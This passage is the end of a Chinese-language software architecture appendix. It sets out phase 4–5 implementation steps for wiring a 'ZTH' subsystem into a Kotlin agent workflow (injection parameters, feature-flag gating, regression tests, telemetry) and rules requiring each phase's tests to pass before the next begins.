  8. 所有 @Provides 注入点在 AgentModule.kt 原文件中追加（P4 纠正，不新建独立 ZthModule.kt）
  9. BackupSnapshot（C.4.10 5 Dto 追加 + BackupManagerImpl import/export safeDao 包装修改）→ BackupManager.kt 原文件 Edit（Preflight 真实路径确认）

Phase 5 / 集成钩子（最后！StatefulAgentWorkflow 7 改造点 + withZthIfEnabled 包装 + Regression 单测）
  目标：所有 ZTH 子系统接入 StatefulAgentWorkflow（C.4.5 REMOTE_SSH 禁用 + C.4.2 总开关 + C.4.1 挂起顺序）
  依赖：Phase 1~4 全部单测绿色（不集成，不进最后 Phase）
  真实落地（纠正 P7：构造参数从 18→23，用 ZthGuardAggregateFacade 门面）：
  1. StatefulAgentWorkflow.kt（L67~L90 构造函数 Edit）：加 5 个注入参数
     - featureFlags（FeatureFlagRepository）
     - performanceClass（PerformanceClassRepository）
     - connectivityWatcher（ConnectivityWatcher）
     - zthFacade（ZthGuardAggregateFacade）
     - pkgMgrTransformer（PkgManagerCommandTransformer）
  2. 实现 isZthActuallyRunnable() 4 关检查（FeatureFlag → REMOTE_SSH → Container Ready → Performance LowEnd）
  3. 实现 withZthIfEnabled(block, fallback) 全局包装（C.4.2 总开关）
  4. 按 §10.1 H1~H7 7 处改造点逐步接入：每次只接 1 个钩子 → Postflight 跑对应单测 → 下一钩子
  5. ProviderEditorScreen（§10.3 UI 替换：三段式 MANUAL 档 BottomSheet + ViewModel 暴露 Flow）
  6. End-to-End 回归测试（AppScaffold 端到端 15 ZTH-INV 不变性全绿 + 非 step 纯文本模型不被 step- 启发式影响 + step-3.7-flash 识图路径回归）
  7. 埋点事件接入所有路径（C.4.16 5 大类 × 14 维度）
```

**Phase 执行不变性 PHASE-INV-1**：
- 严格按 Phase 1 → 2 → 3 → 4 → 5 顺序推进。
- 任何 Phase N 如果 Preflight 未通过（发现文档包路径偏差 / 真实类 Unresolved）→ 暂停 N 先把偏差补进 C.6.2 纠正清单，不得继续。
- 进入下一 Phase 前：上一 Phase 所有 JUnit 单测绿色，且 Postflight 4 项校验全通过。
- **绝不提前写 Phase 5（StatefulAgentWorkflow 集成）**：前 4 Phase 未全绿前不碰原有工作流 1 行代码，防止破坏现有功能。

---

— END OF APPENDIX C —

— END OF COMPLETE TECHNICAL ARCHITECTURE v1.0 —
